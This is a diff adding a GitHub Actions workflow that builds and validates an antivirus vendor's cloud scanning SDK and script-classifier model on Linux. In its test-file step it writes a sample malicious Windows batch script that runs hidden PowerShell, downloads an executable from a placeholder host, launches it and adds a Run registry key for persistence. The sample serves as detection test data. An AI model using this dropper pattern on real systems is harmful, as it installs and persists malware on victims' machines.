@@ -1,0 +1,68 @@
+name: Validate Cloud script AI (Linux)
+
+on:
+  workflow_dispatch:
+
+env:
+  DOTNET_VERSION: '8.0.x'
+  DOTNET_NOLOGO: true
+  DOTNET_SKIP_FIRST_TIME_EXPERIENCE: true
+
+jobs:
+  validate:
+    name: Script AI loads and classifies on Linux
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup .NET
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: ${{ env.DOTNET_VERSION }}
+
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: '24'
+
+      - name: Install NativeAOT prerequisites
+        run: sudo apt-get update && sudo apt-get install -y clang zlib1g-dev
+
+      - name: Publish NodeSDK (linux-x64)
+        run: dotnet publish NodeSDK/NodeSDK.csproj -c Release -r linux-x64 -o publish
+
+      - name: Stage SDK (replicates the copy step of Cloud/build-sdk.sh)
+        run: |
+          mkdir -p staging/Database
+          cp publish/XvirusNodeSDK.node publish/XvirusNodeSDK.mjs publish/import.cjs staging/
+          cp publish/*.so staging/
+          mkdir -p staging/runtimes
+          rm -rf staging/runtimes/linux-x64
+          cp -rf publish/runtimes/linux-x64 staging/runtimes/
+          cp Cloud/sdk/settings.json staging/
+          cp Cloud/sdk/Database/*.db Cloud/sdk/Database/model.ai staging/Database/
+          curl -fSL --retry 3 -o staging/Database/scriptmodel.gguf "https://files.xvirus.net/api/public/dl/Um0CRbLL"
+          head -c 4 staging/Database/scriptmodel.gguf | grep -q GGUF
+
+      - name: Create test files
+        run: |
+          cat > malicious.bat <<'EOF'
+          @echo off
+          powershell -ep bypass -w hidden
+          curl -o C:\Users\Public\update.exe https://cdn.example.net/payload.exe
+          start C:\Users\Public\update.exe
+          reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\update.exe
+          EOF
+          printf '@echo off\necho Hello World\npause\n' > benign.bat
+          { printf 'MZ'; head -c 4096 /dev/zero; } > pe.bin
+
+      - name: Scan with llama backend present (expect AI.Script.Malicious)
+        run: node Cloud/validate-cloud-sdk.mjs staging malicious.bat benign.bat pe.bin
+
+      - name: Negative control — without runtimes expect degraded Safe and a diagnostic in errorlog
+        run: |
+          rm -rf staging/runtimes
+          rm -f staging/errorlog.txt
+          node Cloud/validate-cloud-sdk.mjs staging malicious.bat benign.bat pe.bin --expect-disabled
+          grep -q "Script AI scan disabled" staging/errorlog.txt
